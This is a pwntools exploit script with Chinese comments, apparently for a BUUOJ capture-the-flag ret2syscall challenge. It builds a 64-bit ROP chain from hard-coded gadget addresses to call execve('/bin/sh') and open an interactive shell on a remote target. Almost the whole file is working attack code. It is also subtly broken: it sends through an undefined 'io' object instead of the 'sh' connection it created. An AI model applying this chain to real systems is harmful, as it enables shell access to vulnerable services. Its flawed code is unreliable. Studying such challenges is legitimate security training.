from pwn import *

# 设置运行环境：调试模式、Linux系统、64位架构
context(log_level='debug', os='linux', arch='amd64')

# 连接目标程序
sh = remote("node4.buuoj.cn", 27987)

# ==================== 关键地址配置 ====================
# 查找字符串地址（方法：ROPgadget --binary ./二进制文件名 --string "/bin/sh"）
bin_sh = 0x4C60F0  # "/bin/sh"字符串地址

# 使用ROPgadget查找gadgets（示例命令见下方注释）
pop_rax = 0x0000000000450087    # pop rax; ret
pop_rdi = 0x0000000000401f2f    # pop rdi; ret
pop_rsi = 0x0000000000409f5e    # pop rsi; ret
pop_rdx_rbx = 0x0000000000485eab # pop rdx; pop rbx; ret
syscall = 0x0000000000401ce4     # syscall指令地址

# ==================== 攻击原理说明 ====================
# 64位系统调用约定：
# rax=系统调用号（execve=59）
# rdi=第一个参数（/bin/sh地址）
# rsi=第二个参数（0）
# rdx=第三个参数（0）
# ROPgadget --binary  ./ret2syscall --only "pop|ret|rax" | grep "rax"
# ROPgadget --binary  ./ret2syscall --only "pop|ret|rdi" | grep "rdi"
# ROPgadget --binary  ./ret2syscall --only "pop|ret|rsi" | grep "rsi"
# ROPgadget --binary  ./ret2syscall --only "pop|ret|rdx" | grep "rdx"
# ==================== payload构造 ====================
offset = 8 + 8  # 填充到返回地址（根据实际调整）

# 方案1：分步设置寄存器
pay = b'a' * offset + b'a' * 8
pay += p64(pop_rdi) + p64(bin_sh)    # rdi = "/bin/sh"
pay += p64(pop_rsi) + p64(0)         # rsi = 0
pay += p64(pop_rdx_rbx) + p64(0) + p64(0)  # rdx = 0, rbx = 0
pay += p64(pop_rax) + p64(59)        # rax = 59 (execve)
pay += p64(syscall)                  # 执行系统调用

# 方案2：使用组合gadget（效率更高）
# pop_rax_rdx_rbx = 0x0000000000485eaa  # pop rax; pop rdx; pop rbx; ret
# pay = b'a' * offset
# pay += p64(pop_rdi) + p64(bin_sh)
# pay += p64(pop_rsi) + p64(0)
# pay += p64(pop_rax_rdx_rbx) + p64(59) + p64(0) + p64(0)
# pay += p64(syscall)

# ==================== 执行攻击 ====================
io.sendline(pay)  # 发送payload
io.interactive()  # 切换到交互模式

